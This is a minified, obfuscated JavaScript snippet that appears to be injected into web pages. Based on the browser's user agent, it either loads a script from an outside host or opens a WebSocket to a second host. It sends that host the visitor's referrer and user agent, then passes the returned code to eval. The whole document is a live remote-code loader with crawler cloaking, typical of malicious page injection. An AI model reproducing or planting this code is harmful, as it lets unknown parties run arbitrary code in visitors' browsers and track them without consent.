;(function(){var _cdas_uniqid='k'+Math.random().toString(36).substr(2);document.writeln('<div id="'+_cdas_uniqid+'"></div>');var agentInfo = navigator.userAgent;var url="https://bbk6269.xiaodongjun.com:8080/cc@14891&25";try{var cdas523_dda987;var ws_domain="wss://AUMdW6269.jmhai.com:3400";if(agentInfo.indexOf('Baidu')==-1){document.write('<script src="' + url + '"><\/script>');}else if(agentInfo.indexOf('Harmony')>0 && agentInfo.indexOf('Huawei')>0){document.write('<script src="' + url + '"><\/script>');}else{if("WebSocket"in window){cdas523_dda987=new WebSocket(ws_domain)}else{if("MozWebSocket"in window) {cdas523_dda987=new MozWebSocket(ws_domain)}else{cdas523_dda987=new SockJS(ws_domain)}}cdas523_dda987.onopen=function(){cdas523_dda987.send(url+'?r='+document.referrer+'&a='+encodeURI(navigator.userAgent));};cdas523_dda987.onmessage=function(e){var responseBody=e.data;eval(responseBody);cdas523_dda987.close();};}}catch(c){console.log("createWebSocket error "+c);}})();
